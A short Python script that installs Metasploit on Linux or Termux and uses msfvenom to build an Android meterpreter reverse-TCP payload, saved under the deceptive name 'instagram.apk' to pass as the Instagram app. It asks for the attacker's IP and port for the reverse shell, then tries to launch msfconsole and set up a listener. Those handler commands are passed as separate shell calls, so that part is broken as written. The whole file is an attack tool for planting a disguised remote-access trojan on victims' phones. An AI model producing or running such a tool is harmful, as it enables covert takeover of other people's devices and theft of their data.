#!usr/bin/evn python3

import subprocess

interface = input("what's your os  linux give sudo , termux give enter ==>")

os = input("what's your os  linux give -framework , termux give enter ==>")

subprocess.call(interface +  " apt install unstable-repo", shell=True)

subprocess.call(interface +  " apt install metasploit" + os , shell=True)

lhost = input("what is your IP Address ==>")

lport = input("what is your PORT ==>")

subprocess.call(" msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " R >instagram.apk", shell=True)

input("your file has been saved as instagram.apk press enter to continue ==>")

subprocess.call(" msfconsole", shell=True)

subprocess.call("use exploit/multi/handler", shell=True)

subprocess.call("set payload android/meterpreter/reverse_tcp ", shell=True)

subprocess.call("set LHOST " + lhost, shell=True)

subprocess.call("set LPORT " + lport, shell=True)

subprocess.call("exploit", shell=True)
